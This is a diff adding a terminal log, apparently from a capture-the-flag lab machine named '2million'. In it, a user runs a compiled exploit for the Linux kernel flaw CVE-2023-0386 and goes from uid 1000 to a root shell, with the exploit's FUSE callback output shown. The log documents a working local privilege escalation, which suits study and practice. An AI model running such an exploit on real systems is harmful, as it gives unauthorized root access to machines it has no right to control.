@@ -1,0 +1,29 @@
+admin@2million:/tmp/CVE-2023-0386$ ./exp
+uid:1000 gid:1000
+[+] mount success
+[+] readdir
+[+] getattr_callback
+/file
+total 8
+drwxrwxr-x 1 root   root     4096 Mar  6 02:18 .
+drwxr-xr-x 6 root   root     4096 Mar  6 02:18 ..
+-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
+[+] open_callback
+/file
+[+] read buf callback
+offset 0
+size 16384
+path /file
+[+] open_callback
+/file
+[+] open_callback
+/file
+[+] ioctl callback
+path /file
+cmd 0x80086601
+[+] exploit success!
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+root@2million:/tmp/CVE-2023-0386# whoami
+root
